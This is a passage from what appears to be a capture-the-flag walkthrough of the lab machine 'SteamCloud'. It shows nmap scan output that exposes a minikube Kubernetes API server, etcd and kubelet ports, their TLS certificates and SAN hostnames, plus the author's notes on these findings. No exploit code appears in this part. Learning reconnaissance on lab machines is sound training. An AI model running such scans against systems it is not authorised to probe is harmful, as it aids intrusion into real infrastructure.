+| Not valid after:  2023-02-24T10:00:18
+| MD5:   f0f6 932f f57b 751f 3788 2465 e291 7297
+| SHA-1: 50bc e570 82ad f013 65a2 d66a d717 bd8f c4ba 6ac5
+| -----BEGIN CERTIFICATE-----
+| MIIDSzCCAjOgAwIBAgIIF/UDTwh9K4gwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UE
+| AxMHZXRjZC1jYTAeFw0yMjAyMjQxMDAwMThaFw0yMzAyMjQxMDAwMThaMBUxEzAR
+| BgNVBAMTCnN0ZWFtY2xvdWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+| AQCnl1I7IwuDMOTDh/F99r5MBr6wLofSFcF26E6akYnKogV9MdsyfS7QXJQe1DEG
+| BvuUbkab8bG1Po5hTds00IoqN/K+RtPN1Lv3A6wzdKpbom0/vl5FTjlETd7xd0d9
+| 9artyj5LzShf58h7kMLHpo36lcq3YuGmz5qWXFJLIFSx0uNNDBL7y3S8qA0rxDrm
+| QrbLKwy6+1JMVw5JFBhxyPeZRjc3OVsjP77dQeFJIB7C/IODVUoA66wy3/ytzmas
+| V6ENb3ImyIfXQrkDQg+oQpsggN9FNg3c1AUutXWIhaFabrbdLEVsSvDpgEAVKZy7
+| jUtSbvt17rL90n38QjJR/8lBAgMBAAGjgaEwgZ4wDgYDVR0PAQH/BAQDAgWgMB0G
+| A1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB8GA1Ud
+| IwQYMBaAFKrGOUNDuY5y+kTG5Aesd3GHMoynMD4GA1UdEQQ3MDWCCWxvY2FsaG9z
+| dIIKc3RlYW1jbG91ZIcECgoLhYcEfwAAAYcQAAAAAAAAAAAAAAAAAAAAATANBgkq
+| hkiG9w0BAQsFAAOCAQEAB3VVDEF0TB6KXttqOYEQc4Vmv6zmdiwo90/2TaYODmGO
+| zEvn1HL7KHigPy2sSTgW4kLsG77h2T+cdBx9E2WcDwYzhxzEUgeTbET/3ZE8CZW3
+| LMJZjefg7Eb64Hh1LK2mxM4ZfD+HycjCxDjzvHepDRJRhb0E4Ruq0mc82Fdl4gld
+| hhqaX2OfPcOsfSTmPCdudQ1wECPwIFebZM35SoVlRw/tGjqqGWuZX5yAnERKNzvG
+| HidK0VLxbpGzpKY3dgEd3cEFLQWUj1nUtUvK57z+JIlf+sX6rcoakqE/ebONsanf
+| AbOc+NAQ0UDAbK4xfESRdrTzFKQf40x/6J1xkAnmpw==
+|_-----END CERTIFICATE-----
+| tls-alpn: 
+|_  h2
+2380/tcp  open  ssl/etcd-server? syn-ack
+| ssl-cert: Subject: commonName=steamcloud
+| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+| Issuer: commonName=etcd-ca
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-02-24T10:00:18
+| Not valid after:  2023-02-24T10:00:19
+| MD5:   90f1 8a0e 1329 2de8 cc0a bf22 0deb e77e
+| SHA-1: 7ed6 af6e a836 0e54 e7d3 f41f 47e6 9e45 a22f e2c1
+| -----BEGIN CERTIFICATE-----
+| MIIDSzCCAjOgAwIBAgIIIev/PIiE0eYwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UE
+| AxMHZXRjZC1jYTAeFw0yMjAyMjQxMDAwMThaFw0yMzAyMjQxMDAwMTlaMBUxEzAR
+| BgNVBAMTCnN0ZWFtY2xvdWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+| AQDEPV6J1o8ibccZjouDoG46ZAg2T3YwZdF8ocT3z9dEMaAqZ0qo8uDzQPOq8rPR
+| xg4vU0QEM+KCAxaR0X0e5joDhiIsnpCK9oX1KXSt32nssOQqhclT8Y/POdIR8FSe
+| t0ChhRdm+98aDeEYely1Fbf6/1YnywMo+Ddg3oCKmnZ7mfzX8L38RhLmFkVapvc8
+| nA7q2usxxQfqLGGRaHSFvBAtWsEt5lkvvHqhAQGjH3A3okYgN7DrwOXYP7m685Bn
+| QatgwtJ4igpxHMX0VvU6UbTbqGR13qp5vvOk950G+mkCfynQMr83MJX+vuGsDYXG
+| rd7HkGmosCA76WOQ8jtEtiotAgMBAAGjgaEwgZ4wDgYDVR0PAQH/BAQDAgWgMB0G
+| A1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB8GA1Ud
+| IwQYMBaAFKrGOUNDuY5y+kTG5Aesd3GHMoynMD4GA1UdEQQ3MDWCCWxvY2FsaG9z
+| dIIKc3RlYW1jbG91ZIcECgoLhYcEfwAAAYcQAAAAAAAAAAAAAAAAAAAAATANBgkq
+| hkiG9w0BAQsFAAOCAQEAGoZHJRWchLDwvYf3GK0DO7PXWca3P0zWoox2Sp4C4JmM
+| sMR3TdiN/cdhTdsm6ypjnryi3MV3R+qO9uTo5DoK0KOca66DAj3reYDf0qqluNbL
+| tf04sv2ZXuB0IE4Twd0sVpr8ZJHvkir4NEJW8ePCuzK/1jIxvS5zq9NE3j+tDKE7
+| 8FVVsQ57juMDXVNPiRHRbZyfZ0KkcX5NM0OzaybMNhLznPOm2HsY2k4JS2RvV950
+| kSlC7WiwpaFkMJBVxw9suYw3sB1PlHbOlmZAL3LAQmVrfFE7riWd/E9RVvJgtHtb
+| mXEw6OWlavDZl2rIy9v9MvHl5zPv+blokk3YRAo3QQ==
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  h2
+8443/tcp  open  ssl/https-alt    syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: a46735f2-ecf0-44e0-a5f1-2dbf23c16cd8
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: d63dace0-363f-4687-ac2c-2b7eef876cc1
+|     X-Kubernetes-Pf-Prioritylevel-Uid: 1610c0d9-d53e-4ebc-ad0e-f077ba8aa242
+|     Date: Thu, 24 Feb 2022 18:44:42 GMT
+|     Content-Length: 212
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: 2f9d44a6-248a-4843-aa59-3f3abe62287f
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: d63dace0-363f-4687-ac2c-2b7eef876cc1
+|     X-Kubernetes-Pf-Prioritylevel-Uid: 1610c0d9-d53e-4ebc-ad0e-f077ba8aa242
+|     Date: Thu, 24 Feb 2022 18:44:40 GMT
+|     Content-Length: 185
+|_    {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|_http-title: Site doesn&#x27;t have a title (application/json).
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+| Issuer: commonName=minikubeCA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-02-23T10:00:16
+| Not valid after:  2025-02-23T10:00:16
+| MD5:   3e37 34c8 cf74 2716 c512 b97e 48b2 8821
+| SHA-1: f710 66bb 723d 2bb7 ee41 da40 35bd 4687 c66c f0fd
+| -----BEGIN CERTIFICATE-----
+| MIID3DCCAsSgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+| a3ViZUNBMB4XDTIyMDIyMzEwMDAxNloXDTI1MDIyMzEwMDAxNlowLDEXMBUGA1UE
+| ChMOc3lzdGVtOm1hc3RlcnMxETAPBgNVBAMTCG1pbmlrdWJlMIIBIjANBgkqhkiG
+| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qtVYZMnZqrjlY4dtUcQviqfakQp40qxOTi4
+| hbNvByev51cS1vHq5cb2vYKWcG7y+x4IkJ07sZZ6zW8vAVvckpQ3QnAJB/a9gVmv
+| TVpeS+6UrgEKnWWoe9AEa8Sld5567ACJ6JMe1YPSePuifeBVHsA7yC3SNZ2gKWSw
+| XcAFu0akFZzYhgEV2TLbBb4pkhaM1TAR1my/TQKtuJjBll34tYGZI2p694ay0lx1
+| H6GIRZ0xfMCQrRcJjxESGwo/rrK5gqwaPJvCqnnAlMka5jvHPn+/PXtIQTXUMe3+
+| 5NAmiJOiHT1u+AAjptClcbhd6pUpuLc+uvdxsSgVCF6kU5DfGwIDAQABo4IBHjCC
+| ARowDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD
+| AjAMBgNVHRMBAf8EAjAAMB8GA1UdIwQYMBaAFKlEoIQptW1GxgQZHDJpV6icF0wK
+| MIG5BgNVHREEgbEwga6CCm1pbmlrdWJlQ0GCH2NvbnRyb2wtcGxhbmUubWluaWt1
+| YmUuaW50ZXJuYWyCJGt1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2Nh
+| bIIWa3ViZXJuZXRlcy5kZWZhdWx0LnN2Y4ISa3ViZXJuZXRlcy5kZWZhdWx0ggpr
+| dWJlcm5ldGVzgglsb2NhbGhvc3SHBAoKC4WHBApgAAGHBH8AAAGHBAoAAAEwDQYJ
+| KoZIhvcNAQELBQADggEBALcgyMuUdi/AjZKlGi0OILaHL8Pbrf3avvBQ0l3BdGmb
+| 6qeUCbydGTBqYAoOxjUjnS38obf1ufx5WPZBXJCLVEVev8MBR9bqWyFvqiwIaTAl
+| HYtyF/x8BHyX29HafknSQYVpwFMJATn4MUVyRssRoPmjKKti8z0/rl2P4lDOnyRq
+| skKHzXFxZ82GiadrtZf3RbdApUBoksFTIqlbdwuAqLAVzHuE1TCLQdFeeySidQZt
+| AyW22YG9rWiVVuO1EEVP+LmUz2PuobinUfOQa/WdPjVFBrfg9EcrxY4xpwBflo8y
+| rW/HNNYNuN7MTAzd5nECPdliizhnwTHH9l+jrj52WI4=
+|_-----END CERTIFICATE-----
+10249/tcp open  http             syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn&#x27;t have a title (text/plain; charset=utf-8).
+10250/tcp open  ssl/http         syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn&#x27;t have a title (text/plain; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: OPTIONS
+| ssl-cert: Subject: commonName=steamcloud@1645696822
+| Subject Alternative Name: DNS:steamcloud
+| Issuer: commonName=steamcloud-ca@1645696821
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-02-24T09:00:20
+| Not valid after:  2023-02-24T09:00:20
+| MD5:   75e0 0876 1332 2870 88c8 1c25 0779 3baf
+| SHA-1: 1e7a 4be8 bc35 eaa4 022f aac5 1d9a 8d26 b274 fa91
+| -----BEGIN CERTIFICATE-----
+| MIIDKzCCAhOgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAjMSEwHwYDVQQDDBhzdGVh
+| bWNsb3VkLWNhQDE2NDU2OTY4MjEwHhcNMjIwMjI0MDkwMDIwWhcNMjMwMjI0MDkw
+| MDIwWjAgMR4wHAYDVQQDDBVzdGVhbWNsb3VkQDE2NDU2OTY4MjIwggEiMA0GCSqG
+| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCz5YOGyVTrFBO3YningUYTVbjYrPdXp/JS
+| YHk19SlzkN4/iFXSu9eeJ1bFPCH0U4ZyUjKe60stUj07k9aTTK2N85LotlVGymYg
+| QJjTP4WKk+m0fCDPnMYVG29M9zh89nFHbo5wsT+vebVpM/cF0wJvJetJoesPO+cb
+| eX7/E5BansufQ5xWXcXy0u9gomm977Wd7NpIAotlmL1dQtss/RD7CEA8LKC/rtuL
+| XGy/8YpP/bIvyek1XGiI5Raj6MfQ/afYcaSgYKpvwFeny/0GjPdmf8nwjoON4F5i
+| T97HH10jBdwyf8GwdW5tidaDO3rP08NaIsQjdPjT/LtYHzkoXIEfAgMBAAGjbTBr
+| MA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8E
+| AjAAMB8GA1UdIwQYMBaAFE5aV/DCKe0E/coM/0v/VFFKTkBAMBUGA1UdEQQOMAyC
+| CnN0ZWFtY2xvdWQwDQYJKoZIhvcNAQELBQADggEBADaLRJH7DMnxocvgrrsDdAPK
+| 8yIgVCdT7NeabIqr8rhhclthiVhVMBsUGcvHSLs05ak+A875Mhx+yvtK+8kJ68Zs
+| CPOZ8Ht/1fYrX2/gxuYMkDGOTjJJMdSFW+DFqRfYX560kdTsk82eLlhAGFEbMiVK
+| sEqqRlwTuVFaveolIOhD64859GUafHYeA1frQTy0YqrtDUoB0ADnBelFKIWJ23a0
+| rTgzcJBZZrDmlo3fTZv60iuxGg8GSc3TTEwJhO+pEmPYu8WEcbAULlXOjYStQ0Ky
+| 7Ag5n7oWTYw6rxMwQJzhFkZ/J4RXE8fkw1cJ8Pj0jOfrPyCEJAWrLvnopS8tl70=
+|_-----END CERTIFICATE-----
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+10256/tcp open  http             syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn&#x27;t have a title (text/plain; charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=2/24%Time=6217CDF1%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,22F,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x202f9d4
+SF:4a6-248a-4843-aa59-3f3abe62287f\r\nCache-Control:\x20no-cache,\x20priva
+SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
+SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20d63dace0-363f-4687-ac2c-2b
+SF:7eef876cc1\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x201610c0d9-d53e-4ebc-
+SF:ad0e-f077ba8aa242\r\nDate:\x20Thu,\x2024\x20Feb\x202022\x2018:44:40\x20
+SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\
+SF:&quot;:\&quot;v1\&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden
+SF::\x20User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/
+SF:\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:{},\&quot;code\&quot;:403}\n&quot;)%r(Four
+SF:OhFourRequest,24A,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a46735
+SF:f2-ecf0-44e0-a5f1-2dbf23c16cd8\r\nCache-Control:\x20no-cache,\x20privat
+SF:e\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20no
+SF:sniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20d63dace0-363f-4687-ac2c-2b7
+SF:eef876cc1\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x201610c0d9-d53e-4ebc-a
+SF:d0e-f077ba8aa242\r\nDate:\x20Thu,\x2024\x20Feb\x202022\x2018:44:42\x20G
+SF:MT\r\nContent-Length:\x20212\r\n\r\n{\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;
+SF::\&quot;v1\&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden:
+SF:\x20User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/n
+SF:ice\x20ports,/Trinity\.txt\.bak\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;detail
+SF:s\&quot;:{},\&quot;code\&quot;:403}\n&quot;)%r(GenericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20
+SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
+SF:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(RTSPRequest,67,&quot;HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
+SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(Help,67,&quot;HTTP
+SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
+SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(SSLSe
+SF:ssionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:28
+Completed NSE at 18:28, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:28
+Completed NSE at 18:28, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:28
+Completed NSE at 18:28, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 122.03 seconds</code></pre><p id="803fc633-1eb7-41e8-9ff0-adf6658a7db0" class="">
+</p><p id="c61cdb03-5f35-420d-a11f-8a52ff130428" class="">Lets try using nmap what result we get</p><pre id="c9fb33c2-e974-42df-99b9-5772e5d38bd1" class="code"><code>nmap -sC -sV steamcloud.htb -oN steam</code></pre><p id="bff2080d-a10d-4a5f-a925-f0d635a975fb" class="">
+</p><p id="5413ab15-1198-405e-bf92-be9943fbeab2" class="">got results</p><pre id="ce88cdfb-5e67-450e-b41a-51a408258c6f" class="code"><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 18:32 GMT
+Nmap scan report for steamcloud.htb (10.10.11.133)
+Host is up (0.19s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
+|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
+|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
+8443/tcp open  ssl/https-alt
+|_http-title: Site doesn&#x27;t have a title (application/json).
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: e4444d95-75e1-4249-8a58-53b332c0c63e
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: d63dace0-363f-4687-ac2c-2b7eef876cc1
+|     X-Kubernetes-Pf-Prioritylevel-Uid: 1610c0d9-d53e-4ebc-ad0e-f077ba8aa242
+|     Date: Thu, 24 Feb 2022 18:50:34 GMT
+|     Content-Length: 212
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   GetRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: 017be43e-47b8-4cd8-89a2-965fcb07eed1
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: d63dace0-363f-4687-ac2c-2b7eef876cc1
+|     X-Kubernetes-Pf-Prioritylevel-Uid: 1610c0d9-d53e-4ebc-ad0e-f077ba8aa242
+|     Date: Thu, 24 Feb 2022 18:50:32 GMT
+|     Content-Length: 185
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: 901ee399-82be-4312-8ea6-6773bde669f4
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: d63dace0-363f-4687-ac2c-2b7eef876cc1
+|     X-Kubernetes-Pf-Prioritylevel-Uid: 1610c0d9-d53e-4ebc-ad0e-f077ba8aa242
+|     Date: Thu, 24 Feb 2022 18:50:33 GMT
+|     Content-Length: 189
+|_    {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot options path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+| Not valid before: 2022-02-23T10:00:16
+|_Not valid after:  2025-02-23T10:00:16
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=2/24%Time=6217CF51%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,22F,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20017be
+SF:43e-47b8-4cd8-89a2-965fcb07eed1\r\nCache-Control:\x20no-cache,\x20priva
+SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
+SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20d63dace0-363f-4687-ac2c-2b
+SF:7eef876cc1\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x201610c0d9-d53e-4ebc-
+SF:ad0e-f077ba8aa242\r\nDate:\x20Thu,\x2024\x20Feb\x202022\x2018:50:32\x20
+SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\
+SF:&quot;:\&quot;v1\&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden
+SF::\x20User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/
+SF:\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:{},\&quot;code\&quot;:403}\n&quot;)%r(HTTP
+SF:Options,233,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20901ee399-82b
+SF:e-4312-8ea6-6773bde669f4\r\nCache-Control:\x20no-cache,\x20private\r\nC
+SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
+SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20d63dace0-363f-4687-ac2c-2b7eef876
+SF:cc1\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x201610c0d9-d53e-4ebc-ad0e-f0
+SF:77ba8aa242\r\nDate:\x20Thu,\x2024\x20Feb\x202022\x2018:50:33\x20GMT\r\n
+SF:Content-Length:\x20189\r\n\r\n{\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;:\&quot;v1\
+SF:&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden:\x20Us
+SF:er\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20options\x20path\x20\\\&quot;/\\\
+SF:&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:{},\&quot;code\&quot;:403}\n&quot;)%r(FourOhF
+SF:ourRequest,24A,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20e4444d95-
+SF:75e1-4249-8a58-53b332c0c63e\r\nCache-Control:\x20no-cache,\x20private\r
+SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
+SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20d63dace0-363f-4687-ac2c-2b7eef
+SF:876cc1\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x201610c0d9-d53e-4ebc-ad0e
+SF:-f077ba8aa242\r\nDate:\x20Thu,\x2024\x20Feb\x202022\x2018:50:34\x20GMT\
+SF:r\nContent-Length:\x20212\r\n\r\n{\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;:\&quot;
+SF:v1\&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden:\x2
+SF:0User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/nice
+SF:\x20ports,/Trinity\.txt\.bak\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;
+SF::{},\&quot;code\&quot;:403}\n&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 137.07 seconds</code></pre><p id="31de46a9-b3af-4232-8d80-3419428a3f2c" class="">
+</p><p id="0b0a607f-66b9-4fd3-8604-196eb445cc71" class="">Found many services at port 8443 and many about TLS certificates , here are those:
+</p><ul id="305068ad-0424-4468-917b-d42d0a783921" class="bulleted-list"><li style="list-style-type:disc">minikube/organizationName=system:masters</li></ul><ul id="5a04b5e8-7ca6-43ff-ac5e-7fe964c6a210" class="bulleted-list"><li style="list-style-type:disc">minikubeCA</li></ul><ul id="dc9d32f7-72f0-46b6-b1e5-fce469193e54" class="bulleted-list"><li style="list-style-type:disc">control-plane.minikube.internal</li></ul><ul id="c4922306-2b00-4e6c-b73d-dec890f0735b" class="bulleted-list"><li style="list-style-type:disc">kubernetes.default.svc.cluster.local</li></ul><ul id="0db68163-1c6a-480e-989c-fc657dfd2287" class="bulleted-list"><li style="list-style-type:disc">kubernetes.default.svc</li></ul><ul id="a7ecab6d-59fc-416b-964b-1f3a446fd22a" class="bulleted-list"><li style="list-style-type:disc">kubernetes.default</li></ul><ul id="1272dc03-a312-4487-83a3-38bb97671719" class="bulleted-list"><li style="list-style-type:disc">kubernetes</li></ul><ul id="f35a330f-c725-42cf-a1cd-4ea8f5a399d0" class="bulleted-list"><li style="list-style-type:disc">localhost</li></ul><ul id="2c7bb49d-7888-48e0-95c6-465042fdf150" class="bulleted-list"><li style="list-style-type:disc">10.10.11.133</li></ul><ul id="02a8a979-a30d-46da-98ec-188825c5298c" class="bulleted-list"><li style="list-style-type:disc">10.96.0.1</li></ul><ul id="4985d721-1f54-4002-a01a-8897e3a138f2" class="bulleted-list"><li style="list-style-type:disc">127.0.0.1</li></ul><ul id="5145d4ad-d792-4207-8b82-209bfad51619" class="bulleted-list"><li style="list-style-type:disc">10.0.0.1</li></ul><p 